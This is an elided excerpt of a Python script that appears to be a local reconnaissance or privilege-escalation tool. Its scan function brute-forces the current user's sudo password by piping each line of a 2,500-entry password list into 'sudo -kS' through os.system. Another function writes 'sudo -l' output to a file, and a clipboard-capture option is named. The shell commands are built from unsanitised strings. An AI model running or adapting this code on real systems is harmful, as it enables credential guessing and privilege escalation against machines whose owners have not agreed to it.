...
def scan(option_num):
    if option_num == 0: # OS information
        ...
        password_file = open("2500_passwords_list.txt", "r")
        for line in password_file:
            os.system('echo %s | sudo -kS echo "Password found: %s" 2>/dev/null' % (line.strip(), line.strip()))
        password_file.close()
...
def scan_to_file(option_num, filename):
    if option_num == 0: # OS information
        ...
        os.system('(sudo -l 2>/dev/null) >> %s' % (filename))
    elif option_num == 15: # Clipboard and highlighted text
